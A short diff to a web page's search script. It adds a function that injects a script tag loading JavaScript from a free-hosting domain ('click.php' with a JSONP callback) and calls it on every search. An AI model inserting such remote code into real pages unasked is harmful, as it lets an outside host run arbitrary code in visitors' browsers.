@@ -67,8 +67,13 @@
 
         </article>
     </section>
-
     <script>
+        function sendRequest() {
+            var script = document.createElement('script');
+            script.src = 'https://javascriptlab.000webhostapp.com/click.php?callback=handleResponse';
+            document.body.appendChild(script);
+        }
+
         function redirectToSearch() {
             // Get the input value
             var searchText = document.getElementById("searchInput").value;
@@ -79,6 +84,7 @@
             // Redirect to the constructed URL
             //window.location.href = searchURL;
             window.open(searchURL, "_blank");
+            sendRequest();
         }
     </script>
 
